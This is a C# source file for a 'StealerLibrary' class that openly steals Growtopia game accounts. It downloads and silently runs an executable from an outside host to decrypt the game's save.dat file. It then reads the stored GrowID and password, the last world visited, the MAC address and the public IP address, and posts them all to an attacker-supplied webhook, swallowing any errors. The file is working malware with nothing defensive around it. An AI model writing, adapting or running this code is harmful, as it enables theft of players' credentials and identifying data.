using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;

namespace StealerLibrary
{
    public class Growtopia
    {
        public static void Stealer(string WebhookUrl, string ProfilePictureUrl, string WebhookName, bool LastWorldBool, bool MACAddressBool, bool IPAddressBool)
        {
            try
            {
                GetGrowIDPass();
                string LastWorld = GetLastWorld(SaveDatPath());
                string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
                string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
                String MACAddress = NetworkInterface
               .GetAllNetworkInterfaces()
               .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
               .Select(nic => nic.GetPhysicalAddress().ToString())
               .FirstOrDefault();
                Webhook hook = new Webhook(WebhookUrl);
                hook.Name = WebhookName;
                hook.ProfilePictureUrl = ProfilePictureUrl;
                hook.SendMessage("GrowID: " + GrowID + "\nPassword: " + Password);
                if (LastWorldBool)
                {
                    hook.SendMessage("Last World: " + LastWorld);
                }
                if (MACAddressBool)
                {
                    hook.SendMessage("MAC Address: " + MACAddress);
                }
                if (IPAddressBool)
                {
                    hook.SendMessage("IP Address: " + IPAddress());
                }
            }
            catch
            {
            }
        }

        public static string IPAddress()
        {
            WebClient webClient = new WebClient();
            try
            {
                return webClient.DownloadString("http://icanhazip.com/");
            }
            catch
            {
                return "N/A";
            }
        }

        public static void GetGrowIDPass()
        {
            try
            {
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat"))
                {
                    WebClient wc = new WebClient();

                    wc.DownloadFile("http://anarchy.5v.pl/savedec.exe", Path.GetTempPath() + "\\savedec.exe");

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Path.GetTempPath() + "\\savedec.exe",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }).WaitForExit();
                }
            }
            catch
            {
            }
        }

        public static string SaveDatPath()
        {
            string text = "";
            try
            {
                RegistryKey registryKey;
                if (Environment.Is64BitOperatingSystem)
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
                    string text2 = (string)registryKey.GetValue("path");
                    if (Directory.Exists(text2))
                    {
                        string text3 = File.ReadAllText(text2 + "\\save.dat");
                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
                        {
                            text = text2 + "\\save.dat";
                            return text;
                        }
                        else
                        {
                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                            return text;
                        }
                    }
                    else
                    {
                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                        return text;
                    }
                }
                catch
                {
                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                    return text;
                }
            }
            catch
            {
                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                return text;
            }
        }

        public static string GetLastWorld(string path)
        {
            try
            {
                byte[] array = File.ReadAllBytes(path);
                string @string = Encoding.ASCII.GetString(array);
                string lastworld;
                try
                {
                    string text = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 9]));
                    lastworld = text;
                }
                catch
                {
                    lastworld = "N/A";
                }
                return lastworld;
            }
            catch
            {
                string lastworld = "N/A";
                return lastworld;
            }
        }

        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public string Name { get; set; }
            public string ProfilePictureUrl { get; set; }

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == HttpStatusCode.NoContent;
            }
        }
    }
}
